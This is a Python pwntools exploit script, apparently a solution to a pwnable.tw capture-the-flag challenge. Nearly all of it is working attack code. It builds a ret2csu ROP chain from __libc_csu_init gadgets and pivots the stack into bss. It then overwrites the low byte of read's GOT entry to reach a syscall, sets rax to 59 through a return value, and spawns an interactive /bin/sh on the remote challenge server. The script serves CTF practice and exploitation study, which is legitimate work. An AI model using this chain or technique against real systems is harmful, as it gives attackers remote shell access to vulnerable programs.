from pwn import *
import pwnlib.rop.srop

###Useful Addr
read_got = 0x601000
bss = 0x601028
read_offset = 0xf6670
syscal_offset = 0xf667e

###ROPgadget
pop_rbp = 0x400512
leave = 0x400576
set_value = 0x4005e6
'''
    mov    rbx,QWORD PTR [rsp+0x8]
    mov    rbp,QWORD PTR [rsp+0x10]
    mov    r12,QWORD PTR [rsp+0x18]
    mov    r13,QWORD PTR [rsp+0x20]
    mov    r14,QWORD PTR [rsp+0x28]
    mov    r15,QWORD PTR [rsp+0x30]
    add    rsp,0x38
    ret
'''
call_func = 0x4005d0
'''
    mov    rdx,r15
    mov    rsi,r14
    mov    edi,r13d
    call   QWORD PTR [r12+rbx*8]
    add    rbx,0x1
    cmp    rbx,rbp
    jne    4005d0 <__libc_csu_init+0x50>
    mov    rbx,QWORD PTR [rsp+0x8]
    mov    rbp,QWORD PTR [rsp+0x10]
    mov    r12,QWORD PTR [rsp+0x18]
    mov    r13,QWORD PTR [rsp+0x20]
    mov    r14,QWORD PTR [rsp+0x28]
    mov    r15,QWORD PTR [rsp+0x30]
    add    rsp,0x38
    ret    
'''

###ROPutils
#  The ROP gadgets allow us to call any function which address is known
#  It also let's us set the first 3 parameters
def SET_VALUE_CALL(funcaddr,funcoff,rbp,rdi,rsi,rdx):
    return p64(set_value)+b'a'*8+p64(funcoff)+p64(rbp)+p64(funcaddr)+p64(rdi)+p64(rsi)+p64(rdx)+p64(call_func)+b'a'*0x38

###Exploit
r = remote('chall.pwnable.tw',10403)

#  The original 0x100 read was not enough, so readfurther code to bss and stack migrate
padding = b'a'*0x18
ROPchain  = SET_VALUE_CALL(read_got,0,1,0,bss,0x208)
ROPchain += p64(pop_rbp)
ROPchain += p64(bss)
ROPchain += p64(leave)
payload = padding+ROPchain
payload = payload.ljust(0x100,b'a') #just to fill up 0x100 length in case reading further input by accident
r.send(payload)

new_rbp = p64(bss)
ROPchain  = SET_VALUE_CALL(read_got,0,1,0,bss,0x8)  #Read /bin/sh\x00 to bss
ROPchain += SET_VALUE_CALL(read_got,0,1,0,read_got,0x1) #Hijack last byte of read_got to let it point to syscall
ROPchain += SET_VALUE_CALL(read_got,0,1,1,bss,59)   #rax=1 by now, set rax to 59 by write return value
ROPchain += SET_VALUE_CALL(read_got,0,1,bss,0,0)    #call execve
payload = new_rbp+ROPchain
r.send(payload)

r.send(b'/bin/sh\x00')
r.send(p8(0x7e))

r.interactive()

###Reference
###I meant to use SROP, but somehow didn't. I'll keep those references here anyway
#  https://www.slideshare.net/AngelBoy1/sigreturn-ori
#  https://github.com/lattera/glibc/blob/master/sysdeps/unix/sysv/linux/x86/bits/sigcontext.h
#  https://github.com/Gallopsled/pwntools/blob/292b81af17/pwnlib/rop/srop.py
